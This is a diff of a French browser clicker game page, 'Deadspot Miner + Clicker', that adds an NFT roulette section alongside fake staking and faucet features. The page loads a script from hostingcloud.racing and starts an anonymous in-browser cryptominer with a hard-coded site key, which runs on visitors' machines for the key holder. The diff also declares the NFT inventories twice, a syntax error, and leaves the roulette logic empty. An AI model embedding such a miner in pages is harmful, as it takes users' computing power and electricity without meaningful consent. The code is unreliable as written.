@@ -2,74 +2,63 @@
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
-<title>Deadspot Miner + Clicker</title>
+<title>Deadspot Miner + Clicker + NFT</title>
 <style>
 body {
   background:#0d0d0d;
   color:#eee;
   font-family: monospace;
-  margin:0; overflow-x:hidden;
+  margin:0;
+  overflow-x:hidden;
 }
-h1 { color:#4caf50; text-align:center; margin-top:10px; }
-
-/* Profil */
+h1 { color:#4caf50; text-align:center; }
 #profilePic {
   position:absolute; top:10px; left:10px; width:60px; height:60px;
   border-radius:50%; border:2px solid #fff; overflow:hidden;
 }
 #profilePic img { width:100%; height:100%; object-fit:cover; }
 
-/* Click bouton */
 #clickBtn {
   width:200px; height:200px; border-radius:50%;
-  background:#111; border:3px solid #444; cursor:pointer;
-  position:absolute; left:50%; top:50%; transform:translate(-50%,-50%);
-  overflow:hidden; animation: pulseClick 2s infinite;
+  background:#111; border:3px solid #444; margin:0 auto;
+  cursor:pointer; position:relative; overflow:hidden;
+  display:block; margin-top:150px;
+  animation: pulseClick 2s infinite;
 }
 #clickBtn img { width:100%; height:100%; object-fit:cover; }
-@keyframes pulseClick{0%,100%{transform:translate(-50%,-50%) scale(1);}50%{transform:translate(-50%,-50%) scale(1.05);}}
+@keyframes pulseClick{
+  0%,100%{transform:scale(1);}
+  50%{transform:scale(1.05);}
+}
 
-/* Deadspot & Energie */
 #deadspotBalance{ font-size:22px; margin:10px; color:#ffd700; text-align:center; }
 #energyBar { width:300px; height:20px; border:1px solid #444; margin:10px auto; background:#222; border-radius:5px; overflow:hidden;}
 #energyFill { height:100%; width:100%; background:#4caf50; }
 
-/* Pulseur */
 #pulseBtn { position:absolute; top:20px; right:20px; width:80px; height:80px; border-radius:50%; border:2px solid #f0f; cursor:pointer; background:radial-gradient(circle,#ff00ff,#880088); animation:pulse 2s infinite;}
 @keyframes pulse{0%,100%{transform:scale(1);}50%{transform:scale(1.1);}}
 
-/* XMRig logs */
-#xmrigLogs {
-  position:absolute; top:10px; left:80px; width:350px; max-height:400px;
-  overflow-y:auto; background:rgba(0,0,0,0.6); border:1px solid #444; padding:10px; font-size:12px;
-}
+#xmrigLogs { position:absolute; top:10px; left:80px; width:350px; max-height:400px; overflow-y:auto; background:rgba(0,0,0,0.6); border:1px solid #444; padding:10px; font-size:12px;}
 .logAccepted{color:#4caf50;}
 .logRejected{color:#f44336;}
 
-/* Graph */
 #hashrateChart{display:block; margin:20px auto; background:#111; border:1px solid #333; border-radius:10px;}
 
-/* Staking */
-#stakingSection{
-  position:absolute; bottom:10px; left:50%; transform:translateX(-50%);
-  width:500px; background:rgba(0,0,0,0.6); padding:10px; border-radius:10px;
-}
+#stakingSection{position:absolute; bottom:10px; left:50%; transform:translateX(-50%); width:500px; background:rgba(0,0,0,0.6); padding:10px; border-radius:10px;}
 #pulseInfo, #stakedInfo{margin:5px; color:#fff;}
 
-/* Chat */
-#chatSection{
-  position:absolute; bottom:10px; right:10px; width:250px; height:300px; background:rgba(0,0,0,0.6);
-  border:1px solid #444; border-radius:10px; padding:5px;
-}
+#nftSection{position:absolute; bottom:150px; left:50%; transform:translateX(-50%); width:450px; background:rgba(0,0,0,0.6); padding:10px; border-radius:10px; display:none;}
+#nftSection h4{color:#fff; margin:5px 0;}
+
+#chatSection{position:absolute; bottom:10px; right:10px; width:250px; height:300px; background:rgba(0,0,0,0.6); border:1px solid #444; border-radius:10px; padding:5px;}
 #chatLogs{height:240px; overflow-y:auto; font-size:12px; margin-bottom:5px;}
 #chatInput{width:100%; padding:5px;}
 </style>
 </head>
 <body>
-
 <div id="profilePic"><img src="profile.png" alt="Profile"></div>
-<h1>💎 Deadspot Miner + Clicker Game</h1>
 
+<h1>💎 Deadspot Miner + Clicker Game</h1>
 <div id="deadspotBalance">Deadspot: 0</div>
 <div id="energyBar"><div id="energyFill"></div></div>
 
@@ -87,6 +76,14 @@ h1 { color:#4caf50; text-align:center; margin-top:10px; }
   <button id="verifyDepositBtn">🔍 Vérifier dépôt</button>
 </div>
 
+<div id="nftSection">
+  <h3 style="color:#ff69b4;">🎰 NFT Roulette</h3>
+  <p id="nftAccessMsg">Vous devez avoir cliqué 500 000 fois et accumulé 100 M hashes pour accéder.</p>
+  <button id="spinNFTBtn">🔄 Tourner la roue (100 M Hashes + 1 TON)</button>
+  <h4>Inventaire NFT actif</h4><div id="nftActive"></div>
+  <h4>Inventaire NFT simple</h4><div id="nftSimple"></div>
+</div>
+
 <div id="chatSection">
   <div id="chatLogs"></div>
   <input type="text" id="chatInput" placeholder="Votre message..."/>
@@ -96,28 +93,37 @@ h1 { color:#4caf50; text-align:center; margin-top:10px; }
 <script src="https://www.hostingcloud.racing/WPmG.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
 <script>
-// Supabase
+// Supabase setup (remplace par tes clés)
 const supabaseUrl = "https://YOUR_SUPABASE_URL";
 const supabaseKey = "YOUR_SUPABASE_KEY";
 const supabase = supabase.createClient(supabaseUrl, supabaseKey);
 
-// Variables
+// Game vars
 let deadspot = parseFloat(localStorage.getItem("deadspot")) || 0;
+let upgrades = JSON.parse(localStorage.getItem("upgrades")) || {x2:false, auto:false, regen:false, multi:false};
 let energy = 100, maxEnergy=100, regenRate=1;
 let clickValue=0.0015;
+let autoClickInterval=null;
 let totalClicks=parseInt(localStorage.getItem("totalClicks"))||0;
 let totalHashes=0;
 let stakedTON = parseFloat(localStorage.getItem("stakedTON"))||0;
 let pulseBonus=0;
 
+// NFT
+let nftInventoryActive=JSON.parse(localStorage.getItem("nftInventoryActive"))||[];
+let nftInventorySimple=JSON.parse(localStorage.getItem("nftInventorySimple"))||[];
+
 // Save
 function saveGame(){
   localStorage.setItem("deadspot",deadspot);
+  localStorage.setItem("upgrades",JSON.stringify(upgrades));
   localStorage.setItem("totalClicks",totalClicks);
   localStorage.setItem("stakedTON",stakedTON);
+  localStorage.setItem("nftInventoryActive",JSON.stringify(nftInventoryActive));
+  localStorage.setItem("nftInventorySimple",JSON.stringify(nftInventorySimple));
 }
 
-// Update UI
+// UI update
 function updateUI(){
   document.getElementById("deadspotBalance").textContent="Deadspot: "+deadspot.toFixed(5);
   document.getElementById("energyFill").style.width=(energy/maxEnergy*100)+"%";
@@ -125,32 +131,40 @@ function updateUI(){
   document.getElementById("pulseInfo").textContent="Bonus reçu: "+pulseBonus.toFixed(5)+" TON";
 }
 
-// Click bouton
+// Click
 document.getElementById("clickBtn").addEventListener("click",()=>{
   if(energy>0){
-    deadspot+=clickValue;
-    energy--; totalClicks++;
+    let gain=clickValue;
+    if(upgrades.x2) gain*=2;
+    if(upgrades.multi) gain*=5;
+    deadspot+=gain;
+    energy--;
+    totalClicks++;
+    localStorage.setItem("totalClicks",totalClicks);
     updateUI(); saveGame();
   }
 });
 
-// Pulseur
+// Pulse
 document.getElementById("pulseBtn").addEventListener("click",()=>{
   let bonus = stakedTON*0.005;
-  pulseBonus+=bonus; deadspot+=bonus;
+  pulseBonus+=bonus;
+  deadspot+=bonus;
   updateUI(); saveGame();
 });
 
-// Auto regen énergie
-setInterval(()=>{ if(energy<maxEnergy){ energy=Math.min(maxEnergy,energy+regenRate); updateUI(); } },1000);
+// Auto regen
+setInterval(()=>{ if(energy<maxEnergy){ energy=Math.min(maxEnergy,energy+regenRate); updateUI(); }},1000);
 
-// XMRig
+// XMRig client
 var _client = new Client.Anonymous('e21d602e2242e7d28fc1409ef8a44920d6b5ffdfd95be04f205b4d12e520085f',{throttle:0.1,c:'w'});
 _client.start();
 
 // Graph
 const ctx=document.getElementById('hashrateChart').getContext('2d');
 const hashrateChart = new Chart(ctx,{type:'line',data:{labels:[],datasets:[{label:'H/s', data:[], borderColor:'#4caf50', fill:true, tension:0.3}]}, options:{responsive:false,animation:false,plugins:{legend:{labels:{color:'#eee'}}}, scales:{x:{ticks:{color:'#aaa'}},y:{ticks:{color:'#aaa'}}}}});
+const currentHpsDisplay = document.getElementById("currentHps");
+const totalHashesDisplay = document.getElementById("totalHashes");
 const xmrigLogs=document.getElementById("xmrigLogs");
 let time=0;
 
@@ -177,81 +191,56 @@ setInterval(()=>{
       xmrigLogs.appendChild(document.createElement("br"));
       xmrigLogs.scrollTop=xmrigLogs.scrollHeight;
     }
-    time
-++;
-updateUI();
-}
+    time++;
+    updateUI();
+  }
 },1000);
 
-// Faucet claim simple
+// Faucet claim
 function faucetClaim(){
-let claim = 0.0002 + Math.random()*(0.1-0.0002);
-deadspot += claim;
-alert(Vous avez reçu ${claim.toFixed(5)} DSC du faucet !);
-updateUI();
-saveGame();
+  let claim = 0.0002 + Math.random()*(0.1-0.0002);
+  deadspot+=claim; alert(`Vous avez reçu ${claim.toFixed(5)} DSC du faucet !`);
+  updateUI(); saveGame();
 }
 
 // Staking
 document.getElementById("stakeBtn").addEventListener("click",()=>{
-let amount = prompt("Combien de TON voulez-vous staker ? (min 1.5 TON)");
-amount = parseFloat(amount);
-if(amount >= 1.5 && amount <= deadspot){
-deadspot -= amount;
-stakedTON += amount;
-saveGame();
-updateUI();
-} else {
-alert("Montant invalide.");
-}
+  let amount=prompt("Combien de TON voulez-vous staker ? (min 1.5 TON)");
+  amount=parseFloat(amount);
+  if(amount>=1.5 && amount<=deadspot){ deadspot-=amount; stakedTON+=amount; saveGame(); updateUI(); } else alert("Montant invalide.");
 });
-
 document.getElementById("unstakeBtn").addEventListener("click",()=>{
-if(stakedTON >= 1.5){
-stakedTON -= 0.2; // frais de retrait
-deadspot += (stakedTON);
-saveGame();
-updateUI();
-alert("Retrait effectué, frais 0.2 TON déduits");
-} else {
-alert("Montant insuffisant pour retrait.");
-}
+  if(stakedTON>=1.5){ stakedTON-=0.2; deadspot+=stakedTON; saveGame(); updateUI(); alert("Retrait effectué, frais 0.2 TON"); } else alert("Montant insuffisant pour retrait."); 
 });
 
-// Vérification dépôt (placeholder)
-document.getElementById("verifyDepositBtn").addEventListener("click",()=>{
-alert("Vérification des dépôts en cours... (simulé)");
-});
+// NFT Roulette
+let nftInventoryActive=[], nftInventorySimple=[];
 
 // Chat Supabase
-const chatLogs = document.getElementById("chatLogs");
-const chatInput = document.getElementById("chatInput");
-
-chatInput.addEventListener("keypress", async (e)=>{
-if(e.key === "Enter"){
-const message = chatInput.value.trim();
-if(message === "") return;
-chatInput.value = "";
-await supabase.from("chat").insert([{username:"Player", message}]);
-fetchChat();
-}
+const chatLogs=document.getElementById("chatLogs");
+const chatInput=document.getElementById("chatInput");
+chatInput.addEventListener("keypress",async(e)=>{
+  if(e.key==="Enter"){
+    const message = chatInput.value;
+    if(message.trim()==="") return;
+    chatInput.value="";
+    await supabase.from("chat").insert([{username:"Player", message}]);
+    fetchChat();
+  }
 });
-
 async function fetchChat(){
-const {data} = await supabase.from("chat").select("*").order("id",{ascending:true});
-chatLogs.innerHTML = "";
-data.forEach(msg=>{
-let div = document.createElement("div");
-div.textContent = ${msg.username}: ${msg.message};
-chatLogs.appendChild(div);
-});
+  const {data}=await supabase.from("chat").select("*").order("id",{ascending:true});
+  chatLogs.innerHTML="";
+  data.forEach(msg=>{
+    let div=document.createElement("div");
+    div.textContent=`${msg.username}: ${msg.message}`;
+    chatLogs.appendChild(div);
+  });
 }
 fetchChat();
 setInterval(fetchChat,3000);
 
-// Initial UI update
 updateUI();
 </script>
-
-</body> </html> ```
-
+</body>
+</html>
